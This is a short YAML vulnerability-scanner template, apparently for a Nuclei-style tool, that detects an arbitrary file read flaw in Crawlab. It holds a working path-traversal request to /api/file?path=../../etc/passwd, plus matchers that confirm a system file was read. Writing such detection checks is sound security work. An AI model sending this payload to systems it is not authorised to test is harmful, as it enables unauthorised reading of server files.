id: crawlab-lfi
name: Crawlab - Arbitrary File Read
severity: high
confidence: confirmed
description: Crawlab is vulnerable to arbitrary file read.
reference: https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Crawlab%20file%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
tags:
- crawlab
- lfi
- vuln
requests:
- method: GET
  path: /api/file?path=../../etc/passwd
  matchers:
  - type: regex
    regex:
    - 'root:.*:0:0:'
    - data":"
    - 'error":'
  - type: status
    status:
    - 200
  condition: and
